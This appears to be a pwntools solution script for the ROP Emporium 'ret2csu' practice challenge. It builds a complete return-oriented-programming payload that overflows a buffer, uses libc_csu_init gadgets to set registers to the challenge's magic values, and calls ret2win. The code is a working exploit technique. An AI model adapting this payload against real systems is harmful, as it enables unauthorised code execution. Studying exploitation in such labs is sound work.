from pwn import *

elf = ELF("ret2csu")

set_r15_gadget = 0x4006a2
libcsu_after_something = 0x40064b
set_rdi_gadget =0x00000000004006a3
set_rsi_r15_gadget = 0x00000000004006a1

payload = b"a" * 0x28
payload += p64(set_r15_gadget)
payload += p64(0xd00df00dd00df00d)
payload += p64(libcsu_after_something)
payload += p64(0) * 4
payload += p64(set_rdi_gadget)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(set_rsi_r15_gadget)
payload += p64(0xcafebabecafebabe)
payload += p64(0)
payload += p64(elf.plt["ret2win"])

io = elf.process()
io.sendline(payload)
io.interactive()
